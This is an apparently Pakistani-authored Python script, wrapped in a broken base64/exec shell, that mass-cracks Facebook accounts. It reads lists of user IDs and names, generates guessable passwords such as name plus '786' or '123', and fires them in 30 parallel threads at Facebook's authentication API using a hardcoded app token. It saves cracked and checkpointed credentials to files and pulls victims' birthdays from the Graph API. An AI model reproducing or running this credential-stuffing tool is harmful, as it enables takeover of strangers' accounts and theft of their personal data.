import base64
exec(base64.b64decode("#!/usr/bin/python
# -*- koding: utf-8 -*-

Owner     =  'Muhammad Danish'
Facebook   =  'Facebook.com/MuhammadDanishLOVER'
WhatsApp     =  '+923491120866'

#####MODULE
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from requests.exceptions import ConnectionError
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as par
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup
from datetime import date
from datetime import datetime
from urllib.parse import quote
from bs4 import BeautifulSoup as parser

#USER-AGENT
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]

##### Colour
Z = "\x1b[0;90m"     
M = "\x1b[38;5;196m" 
H = "\x1b[38;5;46m"  
K = "\x1b[38;5;226m" 
B = "\x1b[38;5;44m"  
U = "\x1b[1;95m"     
I = "\x1b[1;96m"     
P = "\x1b[38;5;231m" 
J = "\x1b[38;5;208m" 
A = "\x1b[38;5;248m" 

#
try:
	import requests
except ImportError:
	print(f"{P}[✓]{M} pip install requests")
	os.system("pip install requests")
try:
	import bs4
except ImportError:
	print(f"{P}[✓]{M} pip install bs4")
	os.system("pip install bs4")
try:
	import concurrent.futures
except ImportError:
	print(f"{P}[✓]{M} pip install futures")
	os.system("pip install futures")
host = ("https://mbasic.facebook.com")
B = random.choice([B,U,J,I])
#### Logo
def banner():
    war_dom = random.choice([A,K,I,J,U,H])
    print("""
\n\033[0;96m                    
  
██▄   ██      ▄   ▄█    ▄▄▄▄▄    ▄  █ 
█  █  █ █      █  ██   █     ▀▄ █   █ 
█   █ █▄▄█ ██   █ ██ ▄  ▀▀▀▀▄   ██▀▀█ 
█  █  █  █ █ █  █ ▐█  ▀▄▄▄▄▀    █   █ 
███▀     █ █  █ █  ▐               █  
        █  █   ██                 ▀   
       ▀                              

\033[0;96m╔══\033[0;97m[•] Authur      \033[0;96m╔══\033[0;97m[•] Mr Danish
\033[0;96m╠══\033[0;97m[•] Whatsp      \033[0;96m╠══\033[0;97m[•] +923491120866
\033[0;96m╚══\033[0;97m[•] Github      \033[0;96m╚══\033[0;97m[•] DANISH2086
          
       \033[47m\033[1;31m Danish
\033[41m\033[1;37m X  Baloch \x1b[0m\n
""")
## DATE TIME
skrng = datetime.now()
tahun = skrng.year
bulan = skrng.month
hari  = skrng.day
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "July", "07": "Juli", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
bulan_cek = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
os.system("git pull")
try:
    if bulan < 0 or bulan > 12:
        exit()
    bulan_skrng = bulan - 1
except ValueError:
    exit()
_bulan_ = bulan_cek[bulan_skrng]
tanggal = ("%s-%s-%s"%(hari,_bulan_,tahun))

##### 
id = []
ok = []
cp = []
loop=0

### CLEAR TERMINAL
def resik():
    if "linux" in sys.platform.lower():
        try:os.system("clear")
        except:pass
    elif "win" in sys.platform.lower():
        try:os.system("cls")
        except:pass
    else:
        try:os.system("clear")
        except:pass

###
def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
		
###GLOBAL URL & HEADERS
url_businness = "https://business.facebook.com"
ua_business = "Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/229.0.0.8.128;]"
owner_joke = 'Dont Love And Cry Just Fuck And Fly '
web_fb = "https://www.facebook.com/"
m_fb = "https://m.facebook.com/"
mbasic = "https://mbasic.facebook.com/"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}

### CREATE FOLDER
def mkdir_data_login():
	# Owner
    try:os.mkdir("Original Written By Danish Baloch")
    except:pass
    # Joke
    try:os.mkdir("Dont Love And Cry Just Fuck And Fly")
    except:pass
    # Make Directory Result
    try:os.mkdir("CP")
    except:pass
    # Make Directory Result
    try:os.mkdir("OK")
    except:pass

######  MENU
def baloch():
    os.system("clear");banner()
    print(f"{B}[1] File Crack ")
    print(f"{B}[0] Out ")
    baloch123 = input(f"{P}\n   Choose : {B}")
    if baloch123 in ["0","00"]:
        exit()
    elif baloch123 in ["1","01"]:
    	os.system("clear");banner()
    	mk1()
    else:print(f'{M}  Roung Input !!');os.system('xdg-open https://www.facebook.com/MuhammadDanishLOVER')

def mk1():
			try:
				fileX = input ('\n \033[0;97m[✓] Enter file path : ') 
				for line in open(fileX, 'r').readlines():
					id.append(line.strip())
				fii_xd()
			except IOError:
				exit("\n [x] file %s not found"%(fileX))

def fii_xd():
	mubashir()
	mrbaloch =input(f"{P}   Choose : {P}")
	if mrbaloch in [""]:
		print(f"{B}[*]{M} Roung Input !!");os.system('xdg-open https://www.facebook.com/MuhammadDanishLOVER')
	elif mrbaloch in ["1","01"]:
		print(f"{B} \n \033[0;96m[✓] Want Start Crack {P}Y/t")
		_start_=input(f"{P}\n   Choose : {P}")
		if _start_ in ["t","T"]:
			print(f"{B}   \n{M} Ok Godby !!");os.system('xdg-open https://www.facebook.com/MuhammadDanishLOVER')
			
			
		else:
			print(f"{B} \n \033[0;96m[✓] Crack password manual/default {P}M/D")
			ter =input(f"{P}\n   Choose : {P}")
			if ter in ["m","M"]:
				print(f"{B}   \n{M} Only Support default-Pass !!");os.system('xdg-open https://www.facebook.com/MuhammadDanishLOVER')
				exit()
			elif ter in ["d","D"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					started()
					for user in id:
						uid, name = user.split("|")
						frist=name.split(" ")
						if len(frist)>=6:
							fii = [ name ]
						elif len(frist)<=2:
							fii = [ name ]
						elif len(frist)<=3:
							fii = [ name ]
						else:
							fii = [ name ]

						coeg.submit(apiiii, uid, fii)
				exit()

	elif mrbaloch in ["3","03"]:
		print(f"{B} \n \033[0;96m[✓] Want Start Crack {P}Y/t")
		_start_=input(f"{P}\n   Choose : {P}")
		if _start_ in ["t","T"]:
			print(f"{B}   \n{M} Ok Godby !!");os.system('xdg-open https://www.facebook.com/MuhammadDanishLOVER')

		else:
			print(f"{B} \n \033[0;96m[✓] Crack password manual/default {P}M/D")
			ter =input(f"{P}\n   Choose : {P}")
			if ter in ["m","M"]:
				print(f"{B}   \n{M} Only Support default-Pass !!");os.system('xdg-open https://www.facebook.com/MuhammadDanishLOVER')
				exit()
			elif ter in ["d","D"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					started()
					for user in id:
						uid, name = user.split("|")
						frist=name.split(" ")
						if len(frist)>=6:
							fii = [ name, frist[0]+"786", frist[0]+"123", frist[0]+"1234", frist[0]+"12345", "khankhan", "786786" ]
						elif len(frist)<=2:
							fii = [ name, frist[0]+"786", frist[0]+"123", frist[0]+"1234", frist[0]+"12345", "khankhan", "786786" ]
						elif len(frist)<=3:
							fii = [ name, frist[0]+"786", frist[0]+"123", frist[0]+"1234", frist[0]+"12345", "khankhan", "786786" ]
						else:
							fii = [ name, frist[0]+"786", frist[0]+"123", frist[0]+"1234", frist[0]+"12345", "khankhan", "786786" ]
						coeg.submit(apiiii, uid, fii)
				exit()
				
	elif mrbaloch in ["2","02"]:
		print(f"{B} \n \033[0;96m[✓] Want Start Crack {P}Y/t")
		_start_=input(f"{P}\n   Choose : {P}")
		if _start_ in ["t","T"]:
			print(f"{B}   \n{M} Ok Godby !!");os.system('xdg-open https://www.facebook.com/MuhammadDanishLOVER')

		else:
			print(f"{B} \n \033[0;96m[✓] Crack password manual/default {P}M/D")
			ter =input(f"{P}\n   Choose : {P}")
			if ter in ["m","M"]:
				print(f"{B}   \n{M} Only Support default-Pass !!");os.system('xdg-open https://www.facebook.com/MuhammadDanishLOVER')
				exit()
			elif ter in ["d","D"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					started()
					for user in id:
						uid, name = user.split("|")
						frist=name.split(" ")
						if len(frist)>=6:
							fii = [ name, frist[0]+"786", frist[0]+"123", frist[0]+"1234", frist[0]+"12345" ]
						elif len(frist)<=2:
							fii = [ name, frist[0]+"786", frist[0]+"123", frist[0]+"1234", frist[0]+"12345" ]
						elif len(frist)<=3:
							fii = [ name, frist[0]+"786", frist[0]+"123", frist[0]+"1234", frist[0]+"12345" ]
						else:
							fii = [ name, frist[0]+"786", frist[0]+"123", frist[0]+"1234", frist[0]+"12345" ]
						coeg.submit(apiiii, uid, fii)
				exit()
				
def mubashir():
	
    print(f"{B} \n\033[0;96m ╔══\033[0;97m[1] Crack With Only Name Pass {B}\033[0;96m[v-fast]")
    print(f"{B}\033[0;96m ╠══\033[0;97m[2] Crack With Name+Digits Pass {B}\033[0;96m[slow]")
    print(f"{B}\033[0;96m ╚══\033[0;97m[3] Crack With Name+Digits + Pass {B}\033[0;96m[v-slow]\n")

def started():
	
    os.system("clear");banner();print(f"{B} \n\033[0;96m ╔══\033[0;97m[•] Total id : {P}{len(id)}\x1b[92;1m\n\033[0;96m ╠══\033[0;97m[•] Use Flight Mode Before Use\n\033[0;96m ╚══\033[0;97m[•] Cp Ids JusNow Open ")
    print(f"{B} {P}")

def apiiii(uid, fii):
    try:
        ua = open("ua", "r").read()
    except IOError:
        ua = "Mozilla/5.0 (Linux; Android 9; vivo 1904) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36"
    global ok, cp, loop, token, cookie

    sys.stdout.write(f"\r{B}\033[0;96m   ☢️{P} {loop}|{len(id)} {H}[Ok:{H}{len(ok)}] {K}[Cp:{K}{len(cp)}]");sys.stdout.flush()
    for pw in fii:
        pw = pw.lower()
        headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
        ses = requests.Session()
        send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_inlololid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
        if "session_key" in send.text and "EAAA" in send.text:
            print(f"\r{H}[√] {H}{uid}|{pw}")
            ok.append("%s|%s"%(uid, pw))
            open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
            break
        elif "www.facebook.com" in send.json()["error_msg"]:
            try:
                token  = open('login/token.json','r').read()
                cookie = {'cookie':open('login/cookie.json','r').read()}
                ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
                month, day, year = ttl.split("/")
                month = _bulan_[month]
                print(f"\r{B}[×] {B}{uid}|{pw}•{day} {mont} {year}")
                cp.append("%s|%s"%(uid, pw))
                open("CP/%s.json%"(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
                break
            except (KeyError, IOError):
                day = (" ")
                month = (" ")
                year = (" ")
            except:pass
            print(f"\r{B}\033[0;96m[×] {B}\033[0;96m{uid}|{pw}")
            cp.append("%s|%s"%(uid, pw))
            open("CP/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
            break
        else:
            continue

    loop += 1

#Mozilla/5.0 (Linux; U; Android 6.0; en-US; vivo 1713 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/11.5.0.1015 Mobile Safari/537.36
#Mozilla/5.0 (Linux; Android 8.0.0; HUAWEI Y7 PRO) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36
#Mozilla/5.0 (Linux; Android 9; vivo 1904) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36

if __name__=="__main__":
    os.system("clear")
    mkdir_data_login()
    baloch()
"))